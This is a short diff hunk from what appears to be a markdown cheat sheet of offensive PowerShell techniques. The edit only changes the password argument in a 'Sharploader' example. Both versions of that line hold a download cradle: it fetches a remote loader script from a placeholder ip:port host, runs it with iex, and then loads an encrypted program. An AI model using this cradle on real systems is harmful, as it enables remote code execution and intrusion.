@@ -187,7 +187,7 @@ invoke-Command -ScriptBlock {whoami} -Session $sess
 ##### Sharploader
 
 ```powershell
-iex(new-object net.webclient).downloadstring('http://ip:port/invoke-sharploader.ps1');invoke-sharploader -location http://ip:port/program.enc -password wotton -noArgs`
+iex(new-object net.webclient).downloadstring('http://ip:port/invoke-sharploader.ps1');invoke-sharploader -location http://ip:port/program.enc -password password -noArgs`
 ```
 
 ##### Load Assembly
